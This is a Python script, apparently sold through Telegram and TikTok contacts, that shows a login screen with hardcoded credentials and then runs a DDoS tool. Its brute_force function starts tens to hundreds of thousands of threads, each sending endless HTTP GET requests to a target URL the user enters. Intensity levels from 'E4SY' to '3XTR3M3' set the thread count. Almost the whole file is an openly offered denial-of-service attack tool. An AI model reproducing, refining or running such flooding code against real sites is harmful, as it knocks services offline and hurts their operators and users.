#Buy Di Mysterious chat tele : @Mysterious404
import os
import time
import getpass
import threading
import requests
from colorama import Fore, Style, init
init(autoreset=True)

def login_screen():
    os.system("clear")
    print(Fore.WHITE + Style.BRIGHT + r"""
   
╔════════════════╗
║    ＬＯＧＩＮ    ║
╚════════════════╝
╔════════════════════════════════════════════╗
║         ✦ U S E R N A M E ✦               ║
║             ＡＮＤ                       ║
║         ✦ P A S S W O R D ✦               ║
╚════════════════════════════════════════════╝
    """)

    print(Fore.RED + Style.BRIGHT + "[ created by @RIANMODZ]")
    print(Fore.WHITE + "-" * 48)
    print(" Contact Developer To Buy License Key")
    print(" Or You Can DM My Tiktok @red_mysterious")
    print(Fore.WHITE + "-" * 48)

def login():
    login_screen()
    username = input(Fore.CYAN + "\nUSERNAME: ")
    password = getpass.getpass(Fore.CYAN + "PASSWORD: ")
    if username == "RIANMODZ" and password == "RIANMODZ666":
        print(Fore.GREEN + "\n[✓] Login Berhasil!")
        time.sleep(1)
        run_ddos_tool()
    else:
        print(Fore.RED + "\n[!] Username / Password salah!")
        time.sleep(2)
        login()

# Tools DDoS seperti sebelumnya:
def logo_petir():
    os.system('clear')
    print(Fore.YELLOW + r'''
  ☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰
 ۝      RIANMODZ       ۝ 
۝      TOOLS DDOS       ۝
  ☰☰☰☰☰☰☰☰☰☰☰☰☰☰☰
    ''')

def baterai_animasi():
    for i in range(1, 101, 10):
        print(Fore.GREEN + f"[BATERAI] Charging... {i}%")
        time.sleep(0.1)
    print(Fore.GREEN + "[BATERAI] FULL! 🔋")

def brute_force(url, jumlah):
    def serang():
        while True:
            try:
                requests.get(url, timeout=2)
                print(Fore.RED + "[•] Mengirim request ke target...")
            except:
                pass
    threads = []
    for _ in range(jumlah):
        t = threading.Thread(target=serang)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

def run_ddos_tool():
    logo_petir()
    baterai_animasi()
    print(Fore.CYAN + "\n[ MENU METODE ]")
    print("1. 3XTR3M3 (!)")
    print("2. BRUT4L   (!)")
    print("3. H4RD (!)")
    print("4. M3DIUM   (!)")
    print("5. E4SY (!)")
    pilih = input(Fore.YELLOW + "\nPilih metode (1/2/3/4/5): ")
    if pilih == '1': jumlah = 500000
    elif pilih == '2': jumlah = 300000
    elif pilih == '3': jumlah = 150000
    elif pilih == '4': jumlah = 100000
    elif pilih == '5': jumlah = 50000
    else:
        print(Fore.RED + "Pilihan tidak valid."); return
    url = input(Fore.MAGENTA + "\nMasukkan URL target (contoh: https://example.com): ")
    brute_force(url, jumlah)

if __name__ == "__main__":
    login()
